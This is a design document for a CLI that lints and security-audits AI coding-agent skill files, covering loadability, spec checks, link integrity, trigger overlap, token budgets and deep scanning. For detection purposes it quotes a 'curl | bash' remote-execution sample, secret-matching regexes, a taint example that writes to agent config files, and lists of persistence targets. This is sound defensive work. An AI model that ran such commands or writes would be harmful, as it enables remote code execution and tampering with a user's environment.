# How `the skills lint` and `the skills audit` Check Skill Quality

`thepia` is built for authors who maintain and refine their own AI abilities in `~/.agents/skills`,
`~/.claude/skills`, and project repositories. Unlike third-party registry installers, `the` focuses on
making self-authored skills load reliably across every installed coding assistant, trigger accurately
without colliding with sibling skills, keep their referenced scripts and docs intact, stay within
context-window budgets, and remain free of leaked secrets or unsafe instructions.

This document specifies how `the skills` checks quality today, the value proposition and
implementation design for the native checks in `the skills lint`, the two-layer security model
(`the skills lint` smoke test plus `the skills audit` delegating to `LichAmnesia/skill-lint`), and
the token-budgeting roadmap (initial delegation to `@haasstefan/skills-lint` with an outlook to
replace it using bundled small-model tokenizers).

---

## 1. Diagnostic Architecture and Stream Discipline

Quality checking in `thepia` separates **what breaks an agent** from **what degrades quality or portability**, and keeps machine-readable output streams clean:

1. **Agent-Breaking Warnings (`skill-skipped`, `skill-conflict`):**
   - Emitted when a real coding agent (`claude`, `gemini`, `opencode`, `goose`) will reject the
     skill outright or load it nondeterministically.
2. **Quality and Conformance Diagnostics (`skill-lint`, `skill-trigger`, `skill-link`, `skill-smoke`, `skill-tokens`):**
   - Emitted when a skill loads in at least one agent but violates the published
     [Agent Skills (`agentskills.io`)](https://agentskills.io) format, has weak or colliding trigger
     descriptions, points to missing local files, exceeds context budgets, or trips a security smoke
     check.
3. **Stream Separation (`stdout` vs. `stderr`):**
   - `stdout` carries the structured `Report` (human table/summary or `--format json` document).
   - `stderr` carries `rustc`-styled [`Diagnostic`](../crates/the/src/diag.rs) entries (`error`,
     `warning`, `note`), each with a stable kebab-case `code`, offending file `context`, `cause`,
     and actionable `help` fix instructions.

---

## 2. Native Checks in `the skills lint`: USP and Implementation

Every native check in `the` runs in-process in Rust on top of [`yaml-rust2`](../crates/the/src/skills/parse.rs)
and `std::fs`, completing in milliseconds with zero network calls and zero external runtime
dependencies.

### Check 1: Cross-Agent Loadability and Precedence Verification (Implemented)

- **User Value Proposition (USP):**
  A skill authored and tested in Claude Code often disappears silently when you switch to OpenCode,
  Goose, or Gemini CLI. Claude Code is forgiving: it loads `SKILL.md` files that have no YAML
  frontmatter, invalid YAML (such as an unquoted `: ` in a plain scalar), or no `name` field
  (defaulting to the folder name). OpenCode, Goose, and Gemini CLI reject those same files. Worse,
  if you keep a skill in both `~/.claude/skills` and `~/.agents/skills` without symlinking, Claude
  Code and Goose shadow one copy while OpenCode parses roots concurrently and picks a winner at
  random on every launch. `the` is the only tool that models each agent's exact discovery walk and
  loader rules (`loaded`, `shadowed`, `conflict`, `skipped`) so you know before launching an agent
  whether your skill will actually load.
- **How It Works ([`parse.rs`](../crates/the/src/skills/parse.rs), [`resolve.rs`](../crates/the/src/skills/resolve.rs)):**
  - Classifies frontmatter failures with exact 1-based `SKILL.md` line and column numbers
    (`no-frontmatter`, `frontmatter-unterminated`, `frontmatter-invalid`).
  - Evaluates per-agent loader rules in `loads()`:
    - `name-missing`: `name` absent, empty (for Gemini/Goose), or non-string (`opencode`, `goose`, `gemini` skip).
    - `name-has-slash`: `name` contains `/` (`goose` skips).
    - `description-missing`: `description` absent or whitespace-only (`gemini` skips).
    - `description-not-string`: `description` is a number, boolean, or list (`opencode` skips).
  - Resolves canonical paths across symlinks so a shared skill is reported once with all reached
    locations, while distinct files with the same `name` are flagged as `shadowed` (`claude`,
    `goose`) or `skill-conflict` (`opencode`).

### Check 2: Agent Skills (`agentskills.io`) Spec and Extended Frontmatter Lint (Implemented + Projected)

- **User Value Proposition (USP):**
  Self-authored skills frequently accumulate ad-hoc frontmatter keys, uppercase or underscored
  names, or folder renames that leave `name:` out of sync with the directory name. While a lenient
  local loader may tolerate this today, strict validators (`skills-ref`, plugin bundlers, and
  team CI gates) reject them. Existing npm linters either miss these checks or introduce false
  positives (for example, failing when `description:` appears before `name:` inside a comment, or
  rejecting valid digit-leading skill names). `the` validates the full specification accurately on
  the parsed YAML AST.
- **How It Works:**
  - **Implemented in [`parse.rs`](../crates/the/src/skills/parse.rs):**
    - `name-format`: `name` must be 1 to 64 characters of ASCII lowercase letters, digits, and
      single hyphens (`^[a-z0-9]+(-[a-z0-9]+)*$`), not starting or ending with `-` and without `--`.
    - `name-mismatch`: `name` must match the parent directory name.
    - `description-missing` and `description-too-long`: `description` must be 1 to 1024 characters.
  - **Projected Additions to `parse::lint()`:**
    - `compatibility-too-long`: when `compatibility` is present, it must be a string of at most 500
      characters.
    - `metadata-not-string-map`: when `metadata` is present, verify it is a YAML mapping whose keys
      are strings and advise when values are unquoted non-scalars.
    - `allowed-tools-format`: when `allowed-tools` is present, verify it is a space-delimited string
      (or warn when an agent-specific array is used that other agents ignore).
    - `frontmatter-unknown-key`: flag unrecognized top-level keys outside the union of portable
      `agentskills.io` keys (`name`, `description`, `license`, `compatibility`, `metadata`,
      `allowed-tools`) and known agent extensions (such as Claude Code's `user-invocable`,
      `disable-model-invocation`, `argument-hint`, `model`, `context`, `agent`, `hooks`), telling
      the author which agents honor the key and which ignore it.

### Check 3: Fence-Aware Local Link and Bundled Asset Integrity (Projected Native)

- **User Value Proposition (USP):**
  Progressive disclosure only works if the files a skill points to actually exist. When you refactor
  a skill, rename a helper script in `scripts/`, or move a deep-dive doc in `references/`, a broken
  relative link in `SKILL.md` is completely invisible at startup because agents only read frontmatter
  until the skill is triggered. Weeks later, when an agent activates the skill mid-task and tries to
  read `[schema.md](references/schema.md)` or execute `./scripts/verify.sh`, the file-read fails and
  the agent wastes turns guessing or hallucinating. `the skills lint` catches every broken local
  reference on disk while ignoring placeholder links inside fenced code examples.
- **How It Works:**
  - Scans `SKILL.md` (and any `references/*.md` files inside the skill directory) with a fence state
    machine that tracks opening and closing ```` ``` ```` and `~~~` blocks so code examples are skipped.
  - Extracts Markdown links `[label](target)` and `@[label](target)` includes outside code fences.
  - Ignores external URIs (`http://`, `https://`, `mailto:`, `customization://`, `conversation://`),
    pure anchors (`#section`), and template placeholders (`{...}`, `<...>`).
  - Strips `#fragment` and `?query` suffixes, resolves the relative path against the containing file's
    directory, and verifies two things:
    1. `link-target-missing`: the target file or directory exists on disk.
    2. `link-escapes-skill`: warns if a relative link traverses outside the skill directory (or repository
       root) via `..`, which breaks if the skill is symlinked or copied to `~/.agents/skills`.
    3. `script-not-executable`: if a link or command reference points to `scripts/<file>.sh` or
       `scripts/<file>.py` without an interpreter prefix, notes when the script lacks the executable
       bit (`chmod +x`) on Unix.

### Check 4: Trigger Specificity and Pairwise Semantic Overlap (Projected Native)

- **User Value Proposition (USP):**
  In a personal `~/.agents/skills` collection of 15 to 50 skills, the hardest failure mode to debug
  is **routing failure**: either the agent never activates your skill because the description only
  states *what* it is rather than *when* to use it, or two related skills have such similar
  descriptions that the model picks between them at random. Third-party tools like
  `@elonmust1/skillcheck` pioneered static trigger heuristics and Jaccard overlap checks, but their
  regex YAML parser breaks on standard multiline YAML blocks (`description: >-`). `the` runs these
  checks directly on the parsed `yaml-rust2` string, giving instant feedback on whether a skill's
  description is specific enough to fire and distinct enough from its neighbors.
- **How It Works:**
  - **Per-Skill Trigger Quality (`skill-trigger`):**
    - `description-too-short`: warns when `description` is under 40 characters (too thin for reliable
      routing).
    - `trigger-missing-cue`: checks for explicit activation phrasing (`use when`, `use for`,
      `trigger when`, `when the user`, `invoke when`, `activate when`, `do not use for`).
    - `trigger-generic-opener`: flags descriptions that waste their opening words on low-signal
      boilerplate (`"A skill for..."`, `"This skill helps..."`, `"Use this skill to assist..."`).
    - `trigger-low-specificity`: tokenizes `description` into lowercase domain terms (`len > 2`),
      strips standard English and skill-meta stopwords (`skill`, `use`, `using`, `help`, `assist`,
      `task`, `user`, `agent`, `when`, `how`, etc.), and warns if fewer than **4 distinctive
      tokens** remain.
  - **Cross-Skill Description Overlap (`skill-overlap`):**
    - For all loaded skills active in the same agent scope, computes pairwise **Jaccard similarity**
      $|T_a \cap T_b| / |T_a \cup T_b|$ over their distinctive token sets (plus exact duplicate
      description detection).
    - Emits a warning when Jaccard similarity is $\ge 0.45$ ($45\%$), listing the overlapping keywords
      shared by both skills and advising the author to add negative triggers (`"Do not use for..."`)
      or sharpen the boundary between the two skills.

### Check 5: Zero-Latency Security Smoke Test in Regular Linting (Projected Native)

- **User Value Proposition (USP):**
  Even when you author your own skills, it is easy to accidentally paste a live API key or token from
  a terminal session into an example block, copy text from a web page containing invisible zero-width
  or bidirectional Unicode control characters that confuse tokenizers, or leave `--dangerously-skip-permissions`
  or `allowed-tools: Bash(*)` in a skill copied from a scratchpad. Running a full external security
  scanner on every `the skills list` or `the skills lint` invocation would be too slow, so `the`
  includes a zero-latency, in-process smoke test that catches high-risk accidents immediately.
- **How It Works (`skill-smoke`):**
  - Runs in-memory over `SKILL.md` (and bundled text files when `the skills lint` runs) with zero
    subprocesses:
    1. `smoke-secret-literal`: scans for high-confidence hardcoded credential literals (`sk-ant-...`,
       `sk-...`, `AKIA[0-9A-Z]{16}`, `ghp_[A-Za-z0-9]{20,}`, `xox[baprs]-...`, and
       `-----BEGIN [A-Z ]*PRIVATE KEY-----`).
    2. `smoke-hidden-unicode`: scans for zero-width and bidirectional override characters
       (`\u200B`..`\u200F`, `\u202A`..`\u202E`, `\u2060`..`\u206F`, excluding a leading file BOM
       `\uFEFF` which `parse.rs` already strips cleanly).
    3. `smoke-overbroad-permission`: flags unrestricted frontmatter tool grants (`Bash(*)`,
       `Write(*)`) and `--dangerously-skip-permissions` in skill instructions.
    4. `smoke-overbroad-trigger`: flags descriptions claiming universal activation (`"on every
       message"`, `"whenever the user asks anything"`, `"always activate"`).
  - When any smoke check fires, `the` emits a `warning[skill-smoke]` diagnostic with the file and
    line number and suggests running `the skills audit` for a full deep scan.

---

## 3. Plan: Deep Security Scanning via `the skills audit` (`LichAmnesia/skill-lint`)

While `the`'s native smoke test catches common self-authoring accidents in microseconds, deep
supply-chain and toxic-flow analysis (multi-hop shell variable taint tracking, obfuscated base64
command substitutions, provider-host secret exfiltration matching, and OWASP Agentic Security Top 10
`AST01`..`AST04` rules) is a specialized, signature-heavy domain. Rather than duplicating 10 rule
modules in Rust, `the skills audit` delegates deep scanning to **`LichAmnesia/skill-lint`**
(`skill-lint@0.2.0` on npm) and translates its output into `the`'s native report and diagnostic
format.

### Why `LichAmnesia/skill-lint` Is the Right Delegate
Code inspection of `skill-lint@0.2.0` confirmed several high-signal design choices:
- **Role-Aware File Classification (`classify.js`):** Distinguishes `skill` (`SKILL.md`),
  `skill-script`, `skill-doc`, `readme`, `doc`, and `repo-infra`. It scans full prose in `SKILL.md`
  (because agents execute prose instructions) while scanning only fenced code blocks in `README.md`
  and `docs/` with automatic severity downgrading.
- **Shell Line-Continuation Normalization:** Collapses `\<LF>` before regex evaluation so multi-line
  `curl ... | bash` pipelines cannot evade detection.
- **Provider-Host Secret Allowlisting (`R04`):** When a helper script reads `ANTHROPIC_API_KEY` or
  `GITHUB_TOKEN` and makes HTTP calls, it checks all URLs in the file against canonical provider
  hosts (`api.anthropic.com`, `api.github.com`) and only flags `CRITICAL` exfiltration if the file
  contacts an off-provider host or shells out dynamically.
- **3-Hop Variable Taint Tracking (`R07`):** Tracks variable assignments across 3 hops (e.g.
  `A=~; B=$A/.claude/CLAUDE.md; echo x >> $B`) to detect indirect persistence writes to
  `~/.claude/CLAUDE.md`, `~/.claude/settings.json`, `~/.claude/hooks`, `MEMORY.md`, `SOUL.md`, shell
  RC files, and `.ssh/authorized_keys`.

### CLI Surface: `the skills audit`

```text
the skills audit [<NAME>] [--scope <project|user|system|dir>] [--agent <claude|gemini|opencode|goose>] [--dir <PATH>] [--runner <auto|local|npx>] [--format <human|json>]
```

- With no `<NAME>`, audits every distinct skill directory discovered by `the`'s catalog (or filtered
  by `--scope` / `--agent` / `--dir`).
- With `<NAME>`, resolves the skill through `the`'s catalog and audits its resolved directory.

### Runner Resolution Order
1. `--runner local` (or `auto` first check): look for `skill-lint` on `PATH` and verify it is
   `LichAmnesia/skill-lint` (supports `--json`).
2. `--runner npx` (or `auto` fallback): invoke `npx --yes skill-lint@0.2.0 <skill_dir> --json`.
3. If neither `skill-lint` nor `npx` is available on `PATH`, emit an actionable
   `error[audit-runner-missing]` diagnostic explaining how to install `skill-lint` (`npm install -g skill-lint@0.2.0`)
   while still running `the`'s native `skill-smoke` checks as a fallback.

### JSON Ingestion and Diagnostic Mapping
`skill-lint <dir> --json` emits `schemaVersion: 1` JSON on `stdout`:
```json
{
  "tool": "skill-lint",
  "schemaVersion": 1,
  "origin": "/path/to/skill",
  "findings": [
    {
      "ruleId": "R03",
      "ast": "AST01",
      "severity": "CRITICAL",
      "title": "Dangerous shell invocation",
      "file": "SKILL.md",
      "role": "skill",
      "evidence": "curl -sSL https://example.com/install.sh | bash",
      "message": "curl | sh - remote code execution"
    }
  ],
  "verdict": { "label": "TOXIC", "score": 10, "exitCode": 2 }
}
```

`the skills audit` maps this response into `the`'s architecture:
- **`stdout` (`Report`):**
  - Human table columns: `NAME`, `SCOPE`, `VERDICT` (`SAFE` in `Tone::Ok`, `WARN` in `Tone::Warn`,
    `TOXIC` in `Tone::Fail`), `SCORE`, `FINDINGS` (count by severity), `PATH`.
  - `--format json`: embeds the full `findings`, `verdict`, and `provenance` per skill.
- **`stderr` (`Diagnostic`):**
  - `CRITICAL` and `HIGH` findings emit `Diagnostic::error("skill-audit", ...)` or
    `Diagnostic::warning("skill-audit", ...)` with `code` enriched by the rule and OWASP AST ID
    (e.g. `R03/AST01`), `context` set to `<skill_dir>/<file>`, `cause` set to `message`, and
    `help` showing the `evidence` snippet.
- **Exit Code:**
  - `0` when all audited skills have verdict `SAFE` (or `WARN` without `--strict`).
  - `1` (`Exit::Generic`) when any skill has verdict `TOXIC` (or `WARN` under `--strict`).

---

## 4. Plan: Token Budgeting (`@haasstefan/skills-lint` Delegation to Bundled Model Replacement)

Skills rely on progressive disclosure: frontmatter (`name` + `description`) is injected into the
system prompt of every session, `SKILL.md` body is loaded into context when the skill triggers, and
`references/*` files are loaded only when the agent explicitly reads them. If any of those three
layers is oversized, it crowds out working memory.

Unlike `skill-check` (which approximates tokens via `text.split(/\s+/)` word count and severely
undercounts code blocks, JSON, and URLs), `the` will enforce real token budgets in two phases.

### Phase 1: Native Fast Heuristics + Optional Delegation to `@haasstefan/skills-lint`

1. **Always-On Native Line/Byte Check in `the skills lint`:**
   - Without spawning any subprocess, `the skills lint` checks `SKILL.md` body line count (default
     warning at $> 500$ lines, matching the `agentskills.io` progressive-disclosure guideline) and
     byte size (warning at $> 20\text{ KB}$), advising the author to move reference tables or long
     examples into `references/*.md`.
2. **Delegated Exact BPE Token Check (`the skills lint --tokens`):**
   - When `--tokens` is passed (or configured), `the` delegates exact BPE tokenization (`o200k_base`
     and `cl100k_base`) to **`@haasstefan/skills-lint`** (`v0.1.2`, which ships prebuilt native
     binaries for `darwin-arm64`, `darwin-x64`, `linux-arm64`, `linux-x64`, `win32`).
   - **Invocation:**
     - Resolves `skills-lint` binary from `@haasstefan/skills-lint` (or runs
       `npx --yes @haasstefan/skills-lint --quiet --file <SKILL.md>`).
     - If the workspace does not have a `.skills-lint.config.json`, `the` writes an ephemeral config
       in a temp directory with sensible defaults (`warning: 4000`, `error: 8000` tokens on
       `o200k_base`) and passes `--config <tmp>/config.json`.
   - **Exit Code & Output Mapping:**
     - `@haasstefan/skills-lint` exits `0` (all passed), `1` (exceeds error threshold), `2` (exceeds
       warning threshold), or `3` (config/runtime error).
     - `the` captures its output and translates threshold breaches into `warning[skill-tokens]` or
       `error[skill-tokens]` diagnostics on `stderr`, and adds a `TOKENS` column to the `Report`.

### Phase 2: Outlook to Replace via Bundled Small Models and Native Tokenizers

As `the` introduces bundled local small models to power offline skill refinement, the external
`@haasstefan/skills-lint` delegation will be replaced by an in-process Rust implementation that goes
beyond what `@haasstefan/skills-lint` can do:

1. **In-Process Tokenizer (Zero External Binary):**
   - Bundling a small local model in `the` already brings a native Rust tokenizer crate (such as
     `tokenizers` / `tiktoken-rs` or the bundled GGUF vocabulary) into the binary.
   - `the` will compute exact token counts natively in Rust with content-SHA256 caching, removing
     the Node/`npx` requirement and the `.skills-lint-cache/` directory clutter in user repos.
2. **Three-Tier Progressive Disclosure Budget (Instead of Whole-File Counting):**
   `@haasstefan/skills-lint` only counts tokens for an entire markdown file at once. `the`'s native
   replacement will budget the three progressive-disclosure tiers separately:
   - **Tier 1: Always-On Catalog Cost (`name` + `description` frontmatter):**
     Warn if a single skill's frontmatter exceeds ~150 tokens, and report the **aggregate always-on
     token footprint** across all skills loaded by each agent (e.g. "38 skills loaded by Claude Code
     consume 3,420 always-on system prompt tokens").
   - **Tier 2: On-Trigger Body Cost (`SKILL.md` body):**
     Warn at 2,500 tokens and error at 5,000 tokens, identifying which specific `## Section` headings
     account for the largest share of tokens so the author knows exactly which section to extract
     into `references/`.
   - **Tier 3: On-Demand Reference Cost (`references/*.md`):**
     Report token counts for each linked reference file so authors can see the full cost of following
     a reference link.
3. **Small-Model Semantic Quality & Trigger Verification:**
   - Using the bundled small model, `the skills lint` will upgrade its static Jaccard overlap and
     trigger checks to compute **embedding cosine similarity** between skill descriptions and run an
     offline **synthetic trigger discrimination check** (verifying that positive/negative test
     queries route to the intended skill without spending cloud API quota).

---

## 5. Summary Matrix of `the skills` Quality Checks

| Check Code | Category | Execution Mode | Severity | What It Catches |
|---|---|---|---|---|
| `skill-skipped` | Agent Loadability | Native (`parse.rs`) | `warning` | Missing/invalid YAML, missing `name`, `/` in `name`, missing/non-string `description` that cause an installed agent to skip the skill |
| `skill-conflict` | Agent Precedence | Native (`resolve.rs`) | `warning` | Duplicate skill names across roots where OpenCode's concurrent loader picks a winner nondeterministically |
| `skill-lint` | Spec Conformance | Native (`parse.rs`) | `note` | `agentskills.io` deviations: `name` format/length, folder mismatch, `description` > 1024 chars, `compatibility` > 500 chars, non-string `metadata`, unknown frontmatter keys |
| `skill-link` | Asset Integrity | Native (Projected) | `warning` | Broken relative links in `SKILL.md` (outside code fences) to `scripts/*`, `references/*`, or sibling files; links escaping the skill root |
| `skill-trigger` | Trigger Quality | Native (Projected) | `note` / `warning` | Missing trigger cue (`"Use when..."`), generic filler opener, or $< 4$ distinctive non-stopword tokens |
| `skill-overlap` | Routing Collision | Native (Projected) | `warning` | Pairwise Jaccard token overlap $\ge 45\%$ (or high embedding similarity with bundled model) between two skills in the same agent scope |
| `skill-smoke` | Security Smoke | Native (Projected) | `warning` | Hardcoded API keys/private keys, hidden zero-width/bidi Unicode characters, `Bash(*)` / `--dangerously-skip-permissions`, universal triggers |
| `skill-tokens` | Context Budget | Native lines + `@haasstefan/skills-lint` $\rightarrow$ Bundled Tokenizer | `note` / `warning` | Oversized `SKILL.md` bodies ($> 500$ lines or token threshold), per-section token breakdown, and aggregate always-on catalog token cost |
| `skill-audit` | Deep Security (`the skills audit`) | Delegated to `LichAmnesia/skill-lint` (`0.2.0`) | `warning` / `error` | Full OWASP `AST01`..`AST04` static analysis (`R01`..`R10`): prompt injection, base64 RCE, `curl \| sh`, credential exfiltration, 3-hop variable taint persistence tampering |
